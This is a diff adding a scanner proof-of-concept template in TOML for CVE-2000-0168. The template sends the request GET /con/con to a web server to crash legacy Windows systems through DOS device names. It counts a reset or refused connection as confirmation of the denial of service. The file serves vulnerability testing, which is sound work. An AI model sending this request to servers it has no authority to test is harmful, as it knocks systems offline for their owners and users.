@@ -1,0 +1,29 @@
+[info]
+author = "ave"
+description = "通过向目标 Web 服务器发送包含保留 DOS 设备名（CON、NUL、AUX、PRN、COM1、LPT1 等）的路径请求，触发 Windows 9x/NT/2000 系统蓝屏崩溃，造成拒绝服务。验证方式：发送 GET /con/con 请求后检测服务器连接断开。"
+id = "POC-AVE-2000-0148"
+name = "Microsoft Windows DOS Device in Path Name DoS PoC"
+severity = "medium"
+tags = ["ave-2000-0148"]
+vuln_id = [
+    "CVE-2000-0168",
+    "AVE-2000-0148",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/con/con"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "Connection reset",
+    "connection refused",
+    "reset by peer",
+]
